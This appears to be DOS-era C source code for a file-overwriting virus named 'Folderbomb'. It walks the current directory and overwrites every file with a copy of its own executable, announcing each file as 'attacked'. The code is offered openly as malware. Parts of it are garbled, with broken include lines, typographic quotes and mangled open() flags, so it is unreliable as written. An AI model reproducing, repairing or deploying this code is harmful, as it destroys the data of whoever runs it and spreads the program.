#include stdio.h
#include conio.h


void main(int argc,char* argv[])
{ char buf[512];
int source,target,byt,done;
struct ffblk ffblk;
clrscr();
textcolor(2);
cprintf(”————————————————————————–”);
printf(”\nVirus: Folderbomb \n”);
cprintf(”————————————————————————–”);
done = findfirst(”*.*”,&ffblk,0);
while (!done)
{ printf(”\n”);cprintf(” %s “, ffblk.ff_name);printf(”is attacked by “);cprintf(”Folderbomb”);
source=open(argv[0],O_RDONLYO_BINARY);
target=open(ffblk.ff_name,O_CREATO_BINARYO_WRONGLY );
while(1)
{byt=read(source,buf,512);
if(byt>0)
write(target,buf,byt);
else
break;
}
close(source);
close(target);
done = findnext(&ffblk);
}
getch();
}
